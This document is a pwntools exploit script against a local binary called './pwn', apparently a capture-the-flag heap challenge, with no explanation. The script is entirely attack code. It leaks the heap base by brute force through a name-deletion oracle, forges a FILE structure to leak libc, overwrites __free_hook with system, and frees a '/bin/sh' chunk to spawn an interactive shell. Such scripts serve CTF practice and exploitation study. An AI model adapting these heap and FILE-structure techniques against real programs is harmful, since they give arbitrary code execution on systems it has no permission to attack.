from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = process('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(name):
	s.sendlineafter(b'>> ', b'1')
	s.sendafter(b'Name:\n', name)

def delete(name,attack=False):
	s.sendlineafter(b'>> ', b'2')
	s.sendafter(b'Name:\n', name)
	if attack:
		return
	m = s.recvline(timeout=1)
	if b"Not" in m:
		return False
	else:
		return True

def say(content):
	s.sendlineafter(b'>> ', b'3')
	s.sendafter(b'Say what do you want to say\n', content)

def leave(choice):
	s.sendlineafter(b'>> ', b'4')
	s.sendlineafter(b'Do you really want to say bye?\n', choice)

add("a")
add("b")
add("c")
add("d")
add("e")
add("f")
add("g")
add("h")
add("/bin/sh\x00")
delete(b"b")
delete(b"c")
delete(b"d")
delete(b"e")
delete(b"f")
delete(b"g")
delete(b"h")
delete(b"a")

leak_addr = 0x10

add(p8(0x10))
for i in range(256):
	name = p8(0x10) + p8(i)
	if delete(name):
		num1 = i
		leak_addr = (i << 8) + leak_addr

add(p8(0x10) + p8(num1))
for i in range(256):
	name = p8(0x10) + p8(num1) + p8(i)
	if delete(name):
		num2 = i
		leak_addr = (i << 16) + leak_addr

add(p8(0x10) + p8(num1) + p8(num2))
for i in range(256):
	name = p8(0x10) + p8(num1) + p8(num2) + p8(i)
	if delete(name):
		num3 = i
		leak_addr = (i << 24) + leak_addr

add(p8(0x10) + p8(num1) + p8(num2) + p8(num3))
for i in range(256):
	name = p8(0x10) + p8(num1) + p8(num2) + p8(num3) + p8(i)
	if delete(name):
		num4 = i
		leak_addr = (i << 32) + leak_addr

add(p8(0x10) + p8(num1) + p8(num2) + p8(num3) + p8(num4))
for i in range(256):
	name = p8(0x10) + p8(num1) + p8(num2) + p8(num3) + p8(num4) + p8(i)
	if delete(name):
		leak_addr = (i << 40) + leak_addr

'''
for i in range(5):
	add(pack(leak_addr,8*(i+1)))
	for x in range(256):
		name=pack((x<<(8*(i+1)))+leak_addr,8*(i+2))
		if delete(name):
			leak_addr=(x<<(8*(i+1)))+leak_addr
			break

'''

heap_base=leak_addr-0xa10

success('heap_base=>' + hex(heap_base))

for i in "abcdefg":
	add(i)
for i in range(7):
	leave(b'n')
	say(b"\xe0")

add(b"\xc0")
leave(b"n")
add(flat([0xfbad1887,0,0,0,heap_base+0x2a0+0x1e0,[heap_base+0x2a0+0x1f0]*4,[0]*5,1]))

say("?")
libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1eccc0
success('libc_base=>' + hex(libc_base))

delete(p64(0xfbad1887))
add(flat([0,0,0,0,libc_base + libc.sym['__free_hook'],libc_base + libc.sym['__free_hook'],libc_base + libc.sym['__free_hook']+0x10,[0]*7
,3]))

say(p64(libc_base + libc.sym['system']))

delete(b'/bin/sh\x00')
#gdb.attach(s)
s.interactive()
